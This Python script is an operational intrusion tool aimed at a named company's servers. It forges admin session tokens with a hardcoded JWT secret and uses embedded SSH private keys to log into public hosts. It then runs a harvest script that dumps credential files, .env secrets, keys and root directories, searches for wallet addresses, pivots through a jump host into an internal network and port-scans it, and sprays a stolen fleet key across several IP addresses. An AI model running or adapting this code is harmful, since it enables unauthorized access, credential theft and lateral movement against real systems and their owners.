#!/usr/bin/env python3
# intent 29385 round1: lumii3(coder) real IP confirm + SSH shell + internal 172.31 pivot + lumii6 fleet key
import os, sys, json, base64, subprocess, time
HOST="dashboard.lumiiai.cn"; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
WORK="/tmp/p29385"; os.makedirs(WORK,exist_ok=True)
def R(k,v):
    try: s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode("utf-8","replace")).decode())); sys.stdout.flush()
def sh(a,timeout=120,stdin=None):
    try:
        p=subprocess.run(a,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1,"",repr(e)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    import hmac,hashlib
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())

# keys
K_EZK=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDeVVpa0lJbkNJR0xSZ3krY0Z1TEwycWdoejRCblJhaXVzd0g3SzdvUFZxUUFBQUtDY2piNTluSTIrCmZRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3lVaWtJSW5DSUdMUmd5K2NGdUxMMnFnaHo0Qm5SYWl1c3dIN0s3b1BWcVEKQUFBRUNUTGcyYkFSNUZ4cUd4elJpWkUwZmdKRWFEV0xmVHhsRFpHdVBXZ2tZaUZMSlNLUWdpY0lnWXRHREw1d1c0c3ZhcQpDSFBnR2RGcUs2ekFmc3J1ZzlXcEFBQUFGblZpZFc1MGRVQnBjQzB4TnpJdE16RXRNVFF0TVRNQkFnTUVCUVlICi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=")
K_L3=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBN2x2SEl2eHRpcko4OEhscHQ2MUt1VitGK2FUSEY0azVkeGFVc1M4bmk0UUFBQUpENmFTbDUrbWtwCmVRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTdsdkhJdnh0aXJKNDhIbHB0NjFLdVYrRithVEhGNGs1ZHhhVXNTOG5pNFEKQUFBRUNkMDJwS0pGdnJzbW1KMGs4bHRTc0c0ZmVVaHN5ZGtvcXFMR3lVN1c2ZDFUdVc4Y2kvRzJLc25qd2VXbTNyVXE1WAo0WDVwTWNYaVRsM0ZwU3hMeWVMaEFBQUFER052WkdWeVFHeDFiV2xwTXdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
K_L6=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEK2lGM2FUd2ZGMzFoWkVRbGk0Wkk1cmt6VWNLVXdubkcyTnAzZi9RYlI5d0FBQUpEQnBma0N3YVg1CkFnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRCtpRjNhVHdmRjMxaFpFUWxpNFpJNXJrelVjS1V3bm5HMk5wM2YvUWJSOXcKQUFBRUN2TFZDN1NZUDBoTVpSOENWaEE3MS9aQktBV3orNG9UMU0wL2ErT1JuVjdmNklYZHBQQjhYZldGa1JDV0xoa2ptdQpUTlJ3cFRDZWNiWTJuZC85QnRIM0FBQUFER052WkdWeVFHeDFiV2xwTmdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
def wkey(name,data):
    p=os.path.join(WORK,name); open(p,"wb").write(data); os.chmod(p,0o600); return p
KEZK=wkey("k_ezk",K_EZK); KL3=wkey("k_l3",K_L3); KL6=wkey("k_l6",K_L6)
SSHOPTS=["-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","BatchMode=yes","-o","ConnectTimeout=12","-o","LogLevel=ERROR"]

def ssh_direct(key,user,host,cmd,timeout=120):
    return sh(["ssh","-i",key]+SSHOPTS+["%s@%s"%(user,host),cmd],timeout=timeout)

def ssh_jump(jkey,juser,jhost,tkey,tuser,thost,cmd,timeout=150):
    pc="ssh -i %s %s -W %%h:%%p %s@%s"%(jkey," ".join(SSHOPTS),juser,jhost)
    return sh(["ssh","-i",tkey]+SSHOPTS+["-o","ProxyCommand="+pc,"%s@%s"%(tuser,thost),cmd],timeout=timeout)

HARVEST=r'''set +e
H=/home/coder
echo "ID:"; id; hostname; sudo -n id 2>&1 | head -1
echo "IPADDR:"; ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
echo "ROUTE:"; ip route 2>/dev/null
echo "NEIGH:"; ip neigh 2>/dev/null | head -30
echo "HOSTS:"; cat /etc/hosts 2>/dev/null
echo "SSHCFG:"; cat $H/.ssh/config 2>/dev/null
echo "KNOWNPLAIN:"; grep -aE '^[0-9a-zA-Z]' $H/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u | head -60
echo "AUTHKEYS:"; awk '{print $3}' $H/.ssh/authorized_keys 2>/dev/null
echo "DOCKER:"; sudo docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null | head -40
echo "OPT:"; sudo ls -la /opt 2>/dev/null
echo "ETC_SVC:"; sudo ls /etc/systemd/system/ 2>/dev/null | head -60
echo "ROOTLS:"; sudo ls -la /root 2>/dev/null; sudo ls -la /root/.ssh /root/.aws /root/.docker 2>/dev/null
echo "HOME_LS:"; ls -la $H 2>/dev/null | head -60
echo "FINDCONF:"; sudo find /opt /root /etc /home /srv /var -maxdepth 4 \( -name '.env*' -o -name '*.pem' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '*.key' -o -name '*.token' \) 2>/dev/null | grep -v node_modules | head -80
echo "ZOOFI_GREP:"; sudo timeout 100 grep -rIl -E 'zoofi|wandfi|wand-index|33306' /opt /root /etc /home /srv /var/www /var/lib 2>/dev/null | grep -v node_modules | head -30
echo "EVM_GREP:"; sudo timeout 60 grep -rIl -E 'C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6' /opt /root /etc /home 2>/dev/null | head
echo "ENVHEAD:"; for f in $(sudo find /opt /home/coder /root -maxdepth 3 -name '.env*' 2>/dev/null | head -12); do echo "--$f--"; sudo grep -aE '^(JWT|DATABASE|DB_|POSTGRES|MYSQL|REDIS|LUMII|ZOOFI|WAND|AWS|ALI|TENCENT|AO|.*SECRET|.*KEY|.*TOKEN|.*PASS)' "$f" 2>/dev/null | head -30; done
echo "END_HARVEST"
'''

L6CMD=r'''set +e
echo "ID:"; id; hostname; hostname -I 2>/dev/null; ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'
echo "FLEETKEY:"; ls -la ~/.ssh/id_ed25519 2>/dev/null; ssh-keygen -y -f ~/.ssh/id_ed25519 2>/dev/null | cut -c1-50
echo "SSHCFG:"; cat ~/.ssh/config 2>/dev/null; echo "--authkeys--"; awk '{print $3}' ~/.ssh/authorized_keys 2>/dev/null
echo "DOCKER:"; sudo docker ps --format '{{.Names}}|{{.Image}}' 2>/dev/null | head
echo "SCAN:"; for n in 172.31.12 172.31.13 172.31.14 172.31.15 172.31.16 172.31.17 172.31.18 172.31.19 172.31.20 172.31.21 172.31.22 172.31.23 172.31.24 172.31.25 172.31.26 172.31.27; do for i in $(seq 1 254); do (timeout 1 bash -c "echo >/dev/tcp/$n.$i/22" 2>/dev/null && echo "LIVE $n.$i") & done; wait; done
echo "END_L6"
'''

def main():
    # 0. dashboard agent info (satisfy task 1a)
    tok=forge({"userId":"fc7c3730-4219-11f1-ac43-525400595be1","email":"p@x","customer":"aro","role":"admin"})
    rc,o,e=sh(["curl","--http2","-s","-k","-m","40","-A",UA,"-H","Cookie: session="+tok,"-w","\n__C__%{http_code}","https://%s/api/agents/agent-047f1d22"%HOST],timeout=55)
    R("DASH_AGENT",o[-3000:])
    rc,o,e=sh(["curl","--http2","-s","-k","-m","40","-A",UA,"-H","Cookie: session="+tok,"-w","\n__C__%{http_code}","https://%s/api/me"%HOST],timeout=55)
    R("DASH_ME",o[-800:])

    # 1. lumii3 harvest + scan
    rc,o,e=ssh_direct(KEZK,"coder","18.142.48.45",HARVEST,timeout=200)
    R("L3_RC",rc); R("L3_OUT",o[-60000:]); R("L3_ERR",e[-2000:])

    # 2. lumii6 via ProxyJump through lumii3
    rc,o,e=ssh_jump(KEZK,"coder","18.142.48.45",KL3,"coder","172.31.18.3",L6CMD,timeout=220)
    R("L6_RC",rc); R("L6_OUT",o[-60000:]); R("L6_ERR",e[-2000:])

    # 3. fleet-key public-IP try from runner
    fleet={}
    for ip in ["18.141.172.122","13.250.122.46","18.142.48.45","13.214.183.170","54.179.173.218"]:
        for user in ["coder","ubuntu"]:
            rc,o,e=ssh_direct(KL6,user,ip,"id; hostname; hostname -I 2>/dev/null; sudo -n id 2>&1|head -1",timeout=30)
            fleet["%s@%s"%(user,ip)]={"rc":rc,"out":o[-400:],"err":e[-200:]}
    R("FLEET_PUB",fleet)

try: main()
except Exception:
    import traceback; R("FATAL",traceback.format_exc()[-3000:])
finally: sys.exit(1)
